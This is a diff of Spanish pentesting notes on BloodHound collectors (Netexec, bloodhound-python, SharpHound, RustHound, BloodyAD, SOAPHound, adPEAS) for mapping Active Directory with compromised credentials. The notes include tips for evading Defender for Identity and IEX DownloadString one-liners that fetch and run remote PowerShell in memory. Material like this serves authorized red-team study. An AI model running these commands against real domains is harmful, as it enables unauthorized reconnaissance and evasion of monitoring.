@@ -83,19 +83,31 @@ Una vez obtenido un usuario:
 		- Seleccionar el usuario y dar click en 'Inbound Object Control' para mostrar quien tiene control sobre el objeto seleccionado 
 		- Seleccionar el usuario y dar click en 'Outbound Object Control' para mostrar sobre que objetos tiene control el usuario comprometido 
 
-## BloodHound-Python Recolector
+# Diferentes Recolectores 
+
+## 1. Netexec 
+
+```bash 
+# Recolectar info para BloodHound 
+❯ nxc ldap IP -u 'user' -p 'passwd' --bloodhound --collection All --dns-server IP
+
+NOTA:
+	- Al final de laa ejecución muestra la ruta de almacenamiento 
+```
+
+## 2. BloodHound-Python Recolector
 
 ```bash
 # Recolectar data con credenciales validas 
 ❯ bloodhound-python -u 'user' -p 'passwd' -c All --zip -ns IP_DC -d domain.corp 
 
-Notas: 
+NOTA: 
 	1. Sincronizar el reloj con el DC 
 		❯ ntpdate IP
 	2. Importar todos los archivos en formato 'Json' a BloodHound
 ```
 
-## SharpHound (.exe)
+## 3a. SharpHound (.exe)
 
 Para descargar Sharphound se puede hacer desde la consola de Bloodhound Community Edition.
 
@@ -110,12 +122,12 @@ Para descargar Sharphound se puede hacer desde la consola de Bloodhound Communit
 # Para hacer una recolección aún más sigilosa, remover métodos ruidosos de recolección como RDP,DCOM, PSRemote y LocalAdmin
 ❯ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SharpHound.exe -args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs 
 
-Notas:
+NOTA:
 	1. Usar 'Excludedcs' para evitar la detección MDI
 	2. Remover 'CertServices collection' cuando se use BloodHound Legacy 
 ```
 
-## SharpHound Powershell (.ps1)
+## 3b. SharpHound Powershell (.ps1)
 
 Para descargar Sharphound se puede hacer desde la consola de Bloodhound Community Edition.
 
@@ -123,12 +135,12 @@ Para descargar Sharphound se puede hacer desde la consola de Bloodhound Communit
 ❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/SharpHound.ps1') 
 # Importar el modulo en memoria
 
-❯ Import-Module .\SharpHound.ps1              # Importar el módulo desde el disco 
+❯ Import-Module .\SharpHound.ps1       # Importar el módulo desde el disco 
 
-❯ Invoke-BloodHound -CollectionMethod All     # Iniciar la recolección 
+❯ Invoke-BloodHound -CollectionMethod All    # Iniciar la recolección 
 ```
 
-## SharpHound desde un CMD en Windows 
+## 3c. SharpHound desde un CMD en Windows 
 
 * [RunasCs](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5)
 
@@ -149,13 +161,29 @@ Para descargar Sharphound se puede hacer desde la consola de Bloodhound Communit
 # Autenticarse en un 'CMD' en Windows con credenciales validas
 ❯ runas /netonly /user:domain1.com\username cmd    # Autenticarse con credenciales validas a nivel de red en una CMD en Windows> Este comando abrirá una nueva CMD con las credenciales 
 
-❯ dir \\IP\DIR           # Enumerar el directorio con el usuario autenticado desde una CMD en Windows 
+❯ dir \\IP\DIR        # Enumerar el directorio con el usuario autenticado desde una CMD en Windows 
 
 ❯ .\SharpHound.exe -c all -d domain1.com --domaincontroller <IP>   
 # Enumeración con SharpHound a un dominio con credenciales validas desde una CMD en Windows
 ```
 
-## SOAPHound 
+## 4. RustHound 
+
+* [RustHound](https://github.com/NH-RED-TEAM/RustHound)
+
+```bash 
+# Recolectar info para BloodHound 
+❯ rusthound -d domain.corp -u 'user' -p 'passwd' -n IP_DC -o ./rusthound_output 
+```
+
+## 5. BloodyAD
+
+```bash 
+# Recolectar info para BloodHound 
+❯ bloody -H IP_DC -d domain.corp -u 'user' -p 'passwd' get bloodhound 
+```
+
+## 6. SOAPHound 
 
 * [SOAPHound](https://github.com/FalconForceTeam/SOAPHound)
 
@@ -172,16 +200,17 @@ SOAPHound es más sigiloso. El se comunica con Active Directory Web Services (AD
 ❯ SOAPHound.exe -c C:\AD\Tools\cache.txt --bhdump -o C:\AD\Tools\bloodhound-output --nolaps  
 ```
 
-## ADPeas 
+## 7. ADPeas 
 
 * [ADPeas](https://github.com/61106960/adPEAS)
 
 ```powershell 
 ❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')
 
-❯ Invoke-adPEAS    # Módulo para hacer la enumeración automatizada
+❯ Invoke-adPEAS    # Módulo para hacer la enumeración automatizada 
 
-Notas: 
+
+NOTA: 
 	1. Al usar ADPeas para hacer la recolección ejecuta 'SharpHound' automaticamente
 ```
 
